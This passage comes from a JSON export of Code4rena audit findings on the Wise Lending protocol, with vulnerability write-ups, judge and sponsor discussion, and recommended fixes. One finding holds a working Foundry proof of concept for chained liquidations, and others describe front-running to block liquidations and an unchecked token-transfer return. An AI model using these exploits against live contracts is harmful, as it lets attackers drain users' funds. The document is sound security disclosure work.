commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/160#issuecomment-2018994002):**\n > @vm06007 - This is true; but for it to reduce severity, we would need to see indication that likelihood of this happening (ergo, that the issue is known) is high.\n\n**[Foon256 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/160#issuecomment-2022828054):**\n > @Trust - But this is clearly a centralization issue and is OOS. Or what do I miss here?\n\n**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/160#issuecomment-2022960398):**\n > Not every flaw in a privileged function can be viewed as a centralization issue. Warden demonstrated a plausible way where an HONEST admin interaction leads to incorrect fee allocation, which I consider to be in scope.\n\n**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/160#issuecomment-2032403508):**\n > @Trust - It seems \"honest\" is something caps-locked here so we better unfold this: \n> \n> - If admin decides not to call this, there is no issue.\n> - If admin decides to call this and knows what to do then, there is no issue.\n> - If admin decides to call this and does not know what to do only then it is an issue, so it falls under a category where it does not matter the intention of the admin (honest or dishonest can't really be a thing here). It is more of a question will admin make a mistake when calling that function without follow up, or admin does not make a mistake and makes correct calls on sync as well. \n> \n> Also it is in admins interest to make correct calls as expected. If admin makes a mistake then it is same topic of \"admin error\" no matter the intention.\n\n**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/160#issuecomment-2032415752):**\n > Post-Judging QA is over, so unfortunately, we cannot consider any more arguments (in this submission or any other). I don't see how we can be confident admin knows to follow up this call correctly. If they are not aware of the issue in the report, that's the meaning of an honest mistake in my mind.\n\n**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/160#issuecomment-2082916044):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n\n***\n\n",
      "summary": "\nThe `FeeManager` contract has a bug where the pool fee can be modified by the master address without properly updating the fees beforehand. This can result in incorrect fees being applied to the protocol or its users, depending on whether the fee is increased or decreased. This bug can occur when using the `setPoolFee` or `setPoolFeeBulk` functions. To fix this issue, the `syncPool` modifier should be invoked before modifying the pool fee. This bug is considered low likelihood, but it is still important to address it to ensure accurate fee allocation. The team has implemented a fix for this bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "https://github.com/code-423n4/2024-02-wise-lending-findings/issues/160",
      "tags": [],
      "finders": [
        "0xCiphky"
      ]
    },
    {
      "id": "32098",
      "title": "[M-09] Liquidating chaining can be achieved by liquidating token collateral with the highest `collateralFactor`",
      "impact": "MEDIUM",
      "content": "\nThe liquidation mechanism is intended as follows:\n\n- If a user has more borrowed value than weighted collateral, but it does not surpass the 89% of the unweighted collateral, he can be liquidated up to 50% of his borrowed shares.\n- When the borrowed amount surpass the 89% of the unweighted collateral, then it is considered bad debt and the position can be fully liquidated\n\nThis feature is programmed [here](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurityHelper.sol#L876-L900)\n\nHowever, since the liquidator can select which collateral he will receive, he can intentionally liquidate the highest `collateralFactor` tokens in order to make the overall position's `collateralFactor` to go down and being able to keep liquidating the other tokens. Since the intended maximum amount to liquidate when the position has no bad debt is 50%, if a user can intentionally create a sequence of liquidation that leads to a greater percentage it can be considered a high impact vulnerability.\n\n### Written Proof of Concept\n\nImagine the following situation:\n\nThe protocol supports these 4 tokens, A, B, C and D with these `collateralFactors`:\n\n| Token | Collateral factor |\n| :---- | ----------------: |\n| A     |              0.85 |\n| B     |              0.65 |\n| C     |              0.50 |\n| D     |              0.70 |\n\nThe initial prices for these tokens are as follows:\n\n| Token | Price (in ETH) |\n| :---- | -------------: |\n| A     |              1 |\n| B     |            0.2 |\n| C     |            0.5 |\n| D     |              1 |\n\nAlice deposits these 3 amounts of token A, B and C as collateral:\n\n| Token | Value |       Amount | Unweighted value | Weighted value |\n| :---- | ----: | -----------: | ---------------: | -------------: |\n| A     |     1 |           10 |               10 |            8.5 |\n| B     |   0.2 |           50 |               10 |            6.5 |\n| C     |   0.5 |           20 |               10 |              5 |\n|       |       | Total values |               30 |             20 |\n\nAlice can borrow up to `20 * 0.95 = 19` worth of ETH. For the sake of simplicity, since token D is valued 1 ETH, she can borrow up to 19 of token D. However, she decides to borrow 18.9 to have a tiny healthy zone. Unfortunately for Alice, the price of token C drops to 0.25. And the situation continues as follows:\n\n| Token | Value |       Amount | Unweighted value | Weighted value |\n| :---- | ----: | -----------: | ---------------: | -------------: |\n| A     |     1 |           10 |               10 |            8.5 |\n| B     |   0.2 |           50 |               10 |            6.5 |\n| C     |  0.25 |           20 |                5 |            2.5 |\n|       |       | Total values |               25 |           17.5 |\n\nIn this stage, Alice can be liquidated up to 50% because her borrowed amount (18.9 ETH) is greater than her weighted value (17.5 ETH). Just 50% is liquidable because the 89% of her weighted value is greater than her borrowed amount.\n\nLet's now demonstrate that if the liquidator receives the token with the highest `collateralFactor`, the position will still be liquidable and he can chain this function call in order to liquidate a huge amount of collateral.\n\nThe liquidator decides to repay 9.09 shares of token D. He intentionally selects this amount because when added to the fee (10%), the total amount will be 10 worth of ETH. Hence, liquidating this amount, the user is liquidating the whole token A collateral from Alice with the highest `collateralFactor`. The new borrowed value from Alice would be `18.9 - 9.09 = 9.81`.\n\n| Token | Value |       Amount | Unweighted value | Weighted value |\n| :---- | ----: | -----------: | ---------------: | -------------: |\n| A     |     1 |            0 |                0 |              0 |\n| B     |   0.2 |           50 |               10 |            6.5 |\n| C     |  0.25 |           20 |                5 |            2.5 |\n|       |       | Total values |               15 |              9 |\n\nWe can clearly see that the borrowed value is still greater than Alice's weighted value. Hence, she can be liquidated again! See Coded Proof of Concept to see the full chain liquidation.\n\nThe scenario completely changes if the liquidator would be forced to liquidate the collateral with the lowest `collateralFactor`. The liquidator is forced to receive token C (lowest `collateralFactor`). He decides to repay 4.54 worth of token D that when added with the fee (10%) will be 5. The whole value of collateral token C.\n\n| Token | Value |       Amount | Unweighted value | Weighted value |\n| :---- | ----: | -----------: | ---------------: | -------------: |\n| A     |     1 |           10 |               10 |            8.5 |\n| B     |   0.2 |           50 |               10 |            6.5 |\n| C     |  0.25 |            0 |                0 |              0 |\n|       |       | Total values |               20 |             15 |\n\nThe new borrowed value would be `18.9 - 4.54 = 14.36`. This new borrowed value is smaller than the weighted value. Thus, Alice is no longer liquidable and her position is healthy. See coded Proof of Concept.\n\n### Coded Proof of Concept\n\nFor the sake of testing, I adjusted the collateral factors manually when deploying the protocol locally:\n\n```\n            createPoolArray[0] = PoolManager.CreatePool(\n                {\t\n    \t\t\t\t// Token A\n                    allowBorrow: true,\n                    poolToken: address(MOCK_ERC20_1),\n                    poolMulFactor: 17500000000000000,\n                    poolCollFactor: 0.85 ether,\n                    maxDepositAmount: 10000000000000 ether\n                }\n            );\n\n            createPoolArray[1] = PoolManager.CreatePool(\n                {\n    \t\t\t\t// Token B\n                    allowBorrow: true,\n                    poolToken: address(MOCK_ERC20_2),\n                    poolMulFactor: 25000000000000000,\n                    poolCollFactor: 0.65 ether,\n                    maxDepositAmount: 10000000000000 ether\n                }\n            );\n\n            createPoolArray[2] = PoolManager.CreatePool(\n                {\n    \t\t\t\t// Token C\n                    allowBorrow: true,\n                    poolToken: address(MOCK_ERC20_3),\n                    poolMulFactor: 15000000000000000,\n                    poolCollFactor: 0.5 ether,\n                    maxDepositAmount: 10000000000000 ether\n                }\n            );\n\n            createPoolArray[3] = PoolManager.CreatePool(\n                {\n    \t\t\t\t// Token D\n                    allowBorrow: true,\n                    poolToken: address(MOCK_WETH),\n                    poolMulFactor: 17500000000000000,\n                    poolCollFactor: 0.7 ether,\n                    maxDepositAmount: 10000000000000 ether\n                }\n            );\n```\n\nAnd also created a function inside the `MockChainlink` to set the prices of the tokens:\n\n```\n    \tfunction setNewPrice(uint256 newPrice) public {\n            ethValuePerToken = newPrice;\n        }\n```\n\nWith all that said, let's see the PoC for the 2 previously explained situations:\n\nAlice can be liquidated multiple times:\n\n```\n        function testChainLiquidation() public {\n            address token1 = 0xfDf134B61F8139B8ea447eD49e7e6adf62fd4B49;\n            address token2 = 0xEa3aF45ae5a2bAc059Cd026f23E47bdD753E664a;\n            address token3 = 0x15BB461b3a994218fD0D6329E129846F366FFeB3;\n            address token4 = 0x6B9d657Df9Eab179c44Ff9120566A2d423d01Ea9;\n\n            testDeployLocal();\n            skip(1000);\n\n            // Add some tokens4 to have enough liquidity\n            address thirdParty = makeAddr(\"thirdParty\");\n            deal(address(token4), thirdParty, 1_000_000 ether);\n            vm.startPrank(thirdParty);\n            IERC20(token4).approve(address(LENDING_INSTANCE), 1_000_000 ether);\n            LENDING_INSTANCE.depositExactAmountMint(token4, 1_000_000 ether);\n            vm.stopPrank();\n\n            // Initially the price for tokens are:\n            // 1 Token1 = 1 ETH\n            MOCK_CHAINLINK_1.setNewPrice(1 ether);\n            // 1 Token2 = 0.2 ETH\n            MOCK_CHAINLINK_2.setNewPrice(0.2 ether);\n            // 1 Token3 = 0.5 ETH\n            MOCK_CHAINLINK_3.setNewPrice(0.5 ether);\n            // 1 Token4 = 1 ETH\n            MOCK_CHAINLINK_4.setNewPrice(1 ether);\n\n            // Bob is liquidating Alice\n            address alice = makeAddr(\"alice\");\n            address bob = makeAddr(\"bob\");\n            deal(token1, alice, 10 ether);\n            deal(token2, alice, 50 ether);\n            deal(token3, alice, 20 * 10**6);\n            deal(token4, bob, 200 ether);\n\n            vm.startPrank(alice);\n            IERC20(token1).approve(address(LENDING_INSTANCE), 10 ether);\n            LENDING_INSTANCE.depositExactAmountMint(token1, 10 ether);\n            IERC20(token2).approve(address(LENDING_INSTANCE), 50 ether);\n            LENDING_INSTANCE.depositExactAmount(6, token2, 50 ether);\n            IERC20(token3).approve(address(LENDING_INSTANCE), 20 * 10**6);\n            LENDING_INSTANCE.depositExactAmount(6, token3, 20 * 10**6);\n            LENDING_INSTANCE.borrowExactAmount(6, token4, 18.9 ether);\n            uint256 initialBorrowShares = LENDING_INSTANCE.getPositionBorrowShares(6, token4);\n            vm.stopPrank();\n\n            // Time passes and value of token3 drops significantly\n            // 1 Token3 = 0.25 ETH\n            MOCK_CHAINLINK_3.setNewPrice(0.25 ether);\n\n            vm.startPrank(bob);\n            IERC20(token4).approve(address(LENDING_INSTANCE), 200 ether);\n            LENDING_INSTANCE.depositExactAmountMint(token4, 10 ether);\n            LENDING_INSTANCE.liquidatePartiallyFromTokens(6, 7, token4, token1, 9.090909090909 ether);\n            LENDING_INSTANCE.liquidatePartiallyFromTokens(6, 7, token4, token2, 2.7 ether);\n            LENDING_INSTANCE.liquidatePartiallyFromTokens(6, 7, token4, token2, 3.5 ether);\n            vm.stopPrank();\n\n            uint256 finalBorrowShares = LENDING_INSTANCE.getPositionBorrowShares(6, token4);\n\n            uint256 percentageLiquidated = 100 - (finalBorrowShares * 100 / initialBorrowShares);\n            console.log(\"Percentage liquidated\", percentageLiquidated);\n        }\n```\n\nResult:\n\n```\n    [PASS] testChainLiquidation() (gas: 44546965)\n    Logs:\n      Percentage liquidated 81\n\n    Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 38.40ms\n\n    Ran 1 test suite in 38.40ms: 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n\nWith 3 liquidation calls, the liquidator could repay 81% of Alice's position when in fact, the maximum percentage that the protocol allows when there is no bas debt is 50%.\n\nAlice can only be liquidated once with the asset with lowest `collateralFactor` and then her position becomes healthy:\n\n```\n        function testLiquidationsConstrainted() public {\n            address token1 = 0xfDf134B61F8139B8ea447eD49e7e6adf62fd4B49;\n            address token2 = 0xEa3aF45ae5a2bAc059Cd026f23E47bdD753E664a;\n            address token3 = 0x15BB461b3a994218fD0D6329E129846F366FFeB3;\n            address token4 = 0x6B9d657Df9Eab179c44Ff9120566A2d423d01Ea9;\n\n            uint256 aliceNftPosition = 6;\n            uint256 bobNftPosition = 7;\n\n            testDeployLocal();\n            skip(1000);\n\n            // Add some tokens4 to have enough liquidity\n            address thirdParty = makeAddr(\"thirdParty\");\n            deal(address(token4), thirdParty, 1_000_000 ether);\n            vm.startPrank(thirdParty);\n            IERC20(token4).approve(address(LENDING_INSTANCE), 1_000_000 ether);\n            LENDING_INSTANCE.depositExactAmountMint(token4, 1_000_000 ether);\n            vm.stopPrank();\n\n            // Initially the price for tokens are:\n            // 1 Token1 = 1 ETH\n            MOCK_CHAINLINK_1.setNewPrice(1 ether);\n            // 1 Token2 = 0.2 ETH\n            MOCK_CHAINLINK_2.setNewPrice(0.2 ether);\n            // 1 Token3 = 0.5 ETH\n            MOCK_CHAINLINK_3.setNewPrice(0.5 ether);\n            // 1 Token4 = 1 ETH\n            MOCK_CHAINLINK_4.setNewPrice(1 ether);\n\n            // Bob is liquidating Alice\n            address alice = makeAddr(\"alice\");\n            address bob = makeAddr(\"bob\");\n            deal(token1, alice, 10 ether);\n            deal(token2, alice, 50 ether);\n            deal(token3, alice, 20 * 10**6);\n            deal(token4, bob, 200 ether);\n\n            vm.startPrank(alice);\n            IERC20(token1).approve(address(LENDING_INSTANCE), 10 ether);\n            LENDING_INSTANCE.depositExactAmountMint(token1, 10 ether);\n            IERC20(token2).approve(address(LENDING_INSTANCE), 50 ether);\n            LENDING_INSTANCE.depositExactAmount(aliceNftPosition, token2, 50 ether);\n            IERC20(token3).approve(address(LENDING_INSTANCE), 20 * 10**6);\n            LENDING_INSTANCE.depositExactAmount(aliceNftPosition, token3, 20 * 10**6);\n            LENDING_INSTANCE.borrowExactAmount(aliceNftPosition, token4, 18.9 ether);\n            uint256 initialBorrowShares = LENDING_INSTANCE.getPositionBorrowShares(aliceNftPosition, token4);\n            vm.stopPrank();\n\n            // Time passes and value of token3 drops significantly\n            // 1 Token3 = 0.25 ETH\n            MOCK_CHAINLINK_3.setNewPrice(0.25 ether);\n\n            vm.startPrank(bob);\n            IERC20(token4).approve(address(LENDING_INSTANCE), 200 ether);\n            LENDING_INSTANCE.depositExactAmountMint(token4, 10 ether);\n            LENDING_INSTANCE.liquidatePartiallyFromTokens(aliceNftPosition, bobNftPosition, token4, token3, 4.54 ether);\n\n            // Having liquidated the token with less LVT, the position is no longer liquidable\n            // Try to liquidate with the minimum amount of shares (1)\n            vm.expectRevert();\n            LENDING_INSTANCE.liquidatePartiallyFromTokens(aliceNftPosition, bobNftPosition, token4, token3, 1);\n            vm.stopPrank();\n\n            uint256 finalBorrowShares = LENDING_INSTANCE.getPositionBorrowShares(aliceNftPosition, token4);\n\n            uint256 percentageLiquidated = 100 - (finalBorrowShares * 100 / initialBorrowShares);\n            console.log(\"Percentage liquidated\", percentageLiquidated);\n        }\n```\n\nResult:\n\n```\n    [PASS] testLiquidationsConstrainted() (gas: 44044788)\n    Logs:\n      Percentage liquidated 25\n\n    Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 40.81ms\n\n    Ran 1 test suite in 40.81ms: 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n\nWith just a single liquidation call, the liquidator could only repay 25% of Alice's position and at that point, her position becomes healthy and she is no longer liquidable.\n\n### Recommended Mitigation Steps\n\nThis issue can be easily solved by forcing all liquidations to be done with the lowest `collateralFactor` tokens first. As shown in the written and coded PoC, if the user would have been forced to receive the collateral token with the lowest `collateralFactor`, the health of the position would go to non-liquidable and the liquidator would not be able to continue liquidating the position.\n\nAlso, a really good safety check would be to ensure that after the liquidation is executed, the health of the position must be good in order to prevent this chain liquidation.\n\n### Assessed type\n\nError\n\n**[vonMangoldt (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/202#issuecomment-2007427556):**\n > This is not an issue since the liquidation incentive usually is lower than the difference in percentage between 100 and collateral factor. So paying back in my described scenario always makes the position more healthy. High as a description is overblown! Also, such a force could lead liquidators to be forced to loose money on a specific scenario before being able to access a profitable liquidation endangering the protocol.\n\n**[Trust (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/202#issuecomment-2020860309):**\n > Cascading liquidations are a dangerous situation and I agree with the warden there are no built-in safety mechanisms around it in the liquidation routines (health is monotonically increasing or it is now healthy).\n>\n> However, the warden had to modify the collateral factors to demonstrate the issue in a PoC. It seems hard to determine whether by natural course of action, such a scenario would occur.\n>\n> According to the sponsor's remarks, the `liquidation incentive *usually* is lower than the difference in percentage between 100 and collateral factor.` This has not convinced me it could not occur by chance at some point. In case it does, it leads to higher than expected liquidation penalties. Weighing all the circumstances, I believe Medium to be appropriate.\n\n**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/202#issuecomment-2082914485):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n\n***\n\n",
      "summary": "\nThe liquidation mechanism in the Wise Lending protocol is designed to work in a specific way, but there is a bug that allows for intentional manipulation by liquidators. This allows them to liquidate a larger percentage of a borrower's shares than intended, which can be considered a high impact vulnerability. The bug can be demonstrated through a written and coded proof of concept, and it can be mitigated by forcing liquidations to be done with the lowest collateral factor tokens first and implementing safety checks to prevent chain liquidations. The severity of the bug was initially considered high, but it was later downgraded to medium after discussions with the sponsor and the judge. The bug has been mitigated by the Wise Lending team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "https://github.com/code-423n4/2024-02-wise-lending-findings/issues/202",
      "tags": [],
      "finders": [
        "Draiakoo"
      ]
    },
    {
      "id": "32097",
      "title": "[M-08] Borrowers can DoS liquidations by repaying as little as 1 share.",
      "impact": "MEDIUM",
      "content": "\nLiquidations can be DoSed which increments the risk of bad debt being generated on position.\n\n### Proof of Concept\n\nWhen a liquidator is liquidating a position in `WiseLending`, the liquidator needs to specify the amount of shares to be repaid. The liquidation logic checks if the positions are indeed liquidable, if so, it validates if the number of shares to be liquidated exceeds the total amount of shares that can be liquidated by using the [`WiseSecurityHelper.checkMaxShares() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurityHelper.sol#L876-L900). If the amount of shares the liquidator intends to liquidate exceeds the maximum amount of liquidable shares, the execution is reverted.\n\n- When the position has generated bad debt, the liquidation can liquidate all the user's `borrowShares` on the pool been liquidated.\n- When the position has not generated bad debt, the maximum amount of liquidable shares is 50% of the existing user's `borrowShares` on the pool being liquidated.\n\nThe problem with this approach is that borrowers can frontrun the liquidation and repay as little as 1 share of the existing debt on the same pool that the liquidator decided to liquidate the debt from. This will cause when the liquidation is executed, the total borrow shares of the user on the pool being liquidated to be lower. If the liquidator was trying to liquidate the maximum possible amount of shares, now, the `maxShares` that can be liquidated will be slightly less than the amount of shares that the liquidator specified, which will cause the tx to revert.\n\n```\n    function checkMaxShares(\n        uint256 _nftId,\n        address _tokenToPayback,\n        uint256 _borrowETHTotal,\n        uint256 _unweightedCollateralETH,\n        uint256 _shareAmountToPay\n    )\n        public\n        view\n    {\n        //@audit-ok => total borrowShares a position owns for a _tokenToPayback pool\n        uint256 totalSharesUser = WISE_LENDING.getPositionBorrowShares(\n            _nftId,\n            _tokenToPayback\n        );\n\n        //@audit-info => If baddebt, maxShares that can be liquidated are the totalSharesUser\n        //@audit-info => If not baddebt, maxShares can be 50% of the total borrowShares\n        uint256 maxShares = checkBadDebtThreshold(_borrowETHTotal, _unweightedCollateralETH)\n            ? totalSharesUser\n            : totalSharesUser * MAX_LIQUIDATION_50 / PRECISION_FACTOR_E18;\n\n        if (_shareAmountToPay <= maxShares) {\n            return;\n        }\n\n        //@audit-issue => reverts if the amount of shares to be repaid exceeds maxShares!\n        revert TooManyShares();\n    }\n```\n\nFor example, if there is a position in a liquidable state that has 100 `borrowShares` on the `PoolA`, and a liquidator decides to liquidate the maximum possible amount of shares from this position, it will send a tx to liquidate 50 shares from that position on the `PoolA`. The position's owner can use the [`WiseLending.paybackExactShares() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L1204-L1238) to repay 1 share and frontrun the liquidator's tx. Now, when the liquidator's tx is executed, the position is still liquidable, but it only has 99 `borrowShares` on the `PoolA`. As a result of this, the [`WiseSecurityHelper.checkMaxShares() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurityHelper.sol#L876-L900) will determine that the maximum possible amount of liquidable shares is 49.5, and because the liquidator specified that he intended to liquidate 50 shares, the tx will be reverted.\n\n### Recommended Mitigation Steps\n\nIn the [`WiseSecurityHelper.checkMaxShares() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurityHelper.sol#L876-L900), if the `_shareAmountToPay` exceeds `maxShares`, don't revert; re-adjust the number of shares that can be liquidated. Return the final value of `_shareAmountToPay` and forward it back to the [`WiseLending.liquidatePartiallyFromTokens() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L1250-L1309). Then, use the final value of `shareAmountToPay` to compute the exact amount of tokens to be repaid in the [`WiseLending.liquidatePartiallyFromTokens() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L1250-L1309).\n\n`WiseSecurity.sol`:\n\n```\n    function checksLiquidation(\n        ...\n        uint256 _shareAmountToPay\n    )\n        external\n        view\n    +   returns (uint256)\n    {\n        ...\n\n\n    -   checkMaxShares(\n    +   return checkMaxShares( \n            _nftIdLiquidate,\n            _tokenToPayback,\n            borrowETHTotal,\n            unweightedCollateralETH,\n            _shareAmountToPay\n        );\n    }\n```\n\n`WiseSecurityHelper.sol`:\n\n```\nfunction checkMaxShares(\n    ...\n    uint256 _shareAmountToPay\n)\n    public\n    view\n+   returns (uint256)    \n{\n    ...\n\n    uint256 maxShares = checkBadDebtThreshold(_borrowETHTotal, _unweightedCollateralETH)\n            ? totalSharesUser\n            : totalSharesUser * MAX_LIQUIDATION_50 / PRECISION_FACTOR_E18;\n\n    if (_shareAmountToPay <= maxShares) {\n-       return;\n+       return _shareAmountToPay;\n+   } else {\n+       return maxShares;\n+   }\n\n-   revert TooManyShares();\n}\n```\n\n`WiseLending.sol`:\n\n```\n    function liquidatePartiallyFromTokens(\n        ...\n        uint256 _shareAmountToPay\n    )\n        ...\n    {\n        ...\n\n    -   data.shareAmountToPay = _shareAmountToPay;\n\n        ...\n\n        //@audit-info => First, determine the maximum amount of liquidable shares\n    +   data.shareAmountToPay = WISE_SECURITY.checksLiquidation(\n    +     _nftId,\n    +     _paybackToken,\n    +     _shareAmountToPay\n    +   );\n\n        //@audit-info => Then, compute the exact amount of tokens required to liquidate the final amount of liquidable shares\n        data.paybackAmount = paybackAmount(\n            _paybackToken,\n    -       _shareAmountToPay\n    +       data.shareAmountToPay\n        );\n\n        ...\n\n    -   WISE_SECURITY.checksLiquidation(\n    -       _nftId,\n    -       _paybackToken,\n    -       _shareAmountToPay\n    -   );\n\n        ...\n    }\n```\n\n### Assessed type\n\nContext\n\n**[vonMangoldt (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/237#issuecomment-2009554797):**\n > Instead of wasting gas by frontrunning a newbie liquidator they could also make money and liquidate themselves. On Arbitrum it's not possible at all. If liquidators don't use tools like flashbots or eden, it's their own fault. No reason to do anything here, in my opinion. Dismissed.\n\n**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/237#issuecomment-2020890116):**\n > Whether the option for liquidators to bypass hacks through private mempools is grounds for reducing severity of their abuse is not a trivial question and would best be standardized in the Supreme Court.\n> \n> I'm taking a stance that this cheap hack is annoying enough for liquidators to be worth Medium severity. Note that if private mempool is in-scope, attacker can use it as well and insert the annoying TX at start of block.\n\n**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/237#issuecomment-2090437915):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n>\n> Mentioned issue does not seem to be in interest of the borrower, since borrower is more incentivized to perform self-liquidation to earn than preventing others, which becomes a race on who will liquidate first making liquidation a more desired outcome for both parties, no intention to gate the minimum payback threshold by admin.\n***\n\n",
      "summary": "\nThe bug report discusses a vulnerability in the liquidation process of WiseLending, which can potentially lead to bad debt being generated on a position. The issue occurs when a borrower can front-run a liquidator's transaction and repay a small amount of debt, causing the liquidator's transaction to fail. This can lead to the liquidator not being able to liquidate the maximum amount of shares they intended to, resulting in the transaction being reverted. The recommended mitigation steps involve adjusting the number of shares that can be liquidated if the maximum amount is exceeded, rather than reverting the transaction. The severity of this issue is debated, but it is ultimately decided to be a medium severity. The issue has been mitigated by the team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "https://github.com/code-423n4/2024-02-wise-lending-findings/issues/237",
      "tags": [],
      "finders": [
        "0xStalin",
        "Dup1337",
        "Jorgect"
      ]
    },
    {
      "id": "32096",
      "title": "[M-07] Unchecked return value bug on `TransferHelper::_safeTransferFrom()`",
      "impact": "MEDIUM",
      "content": "\nCurrently, the `WiseLending` protocol supports several ERC-20 tokens and will also support more tokens in the future:\n\n> *ERC20 in scope: WETH, WBTC, LINK, DAI, WstETH, sDAI, USDC, USDT, WISE and may others in the future. (Also corresponding Aave tokens if existing).*\n\nOn some ERC-20 tokens, the [`transferFrom()` will return `false` on failure instead of reverting a transaction](https://github.com/d-xo/weird-erc20?tab=readme-ov-file#no-revert-on-failure). I noticed that the `TransferHelper::_safeTransferFrom()`, which is used throughout the protocol, is vulnerable to detecting the token transfer failure if the `transferFrom()` returns `false` due to the unchecked return value bug.\n\nThe following lists the functions directly invoking the vulnerable `_safeTransferFrom()`:\n\n1. [`WiseCore::_coreLiquidation()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L674-L679)\n2. [`WiseLending::depositExactAmount()]`(https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L476-L481)\n3. [`WiseLending::solelyDeposit()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L622-L627)\n4. [`WiseLending::paybackExactAmount()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L1190-L1195)\n5. [`WiseLending::paybackExactShares()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L1230-L1235)\n6. [`FeeManager::paybackBadDebtForToken()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/FeeManager/FeeManager.sol#L788-L793)\n7. [`FeeManager::paybackBadDebtNoReward()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/FeeManager/FeeManager.sol#L860-L865)\n8. [`PendlePowerFarm::_manuallyPaybackShares()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarm.sol#L136-L141)\n9. [`PendlePowerManager::enterFarm()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerManager.sol#L109-L114)\n10. [`PendlePowerFarmController::exchangeRewardsForCompoundingWithIncentive()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L86-L91)\n11. [`PendlePowerFarmController::exchangeLpFeesForPendleWithIncentive()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L142-L147)\n12. [`PendlePowerFarmController::lockPendle()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L397-L402)\n13. [`PendlePowerFarmToken::addCompoundRewards()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L518-L523)\n14. [`PendlePowerFarmToken::depositExactAmount()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L579-L584)\n15. [`AaveHub::depositExactAmount()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WrapperHub/AaveHub.sol#L132-L137)\n16. [`AaveHub::paybackExactAmount()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WrapperHub/AaveHub.sol#L451-L456)\n17. [`AaveHub::paybackExactShares()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WrapperHub/AaveHub.sol#L583-L588)\n\nDue to the unchecked return value bug, users or attackers can exploit these protocol's functions without supplying a token (please refer to the `Proof of Concept` section for more 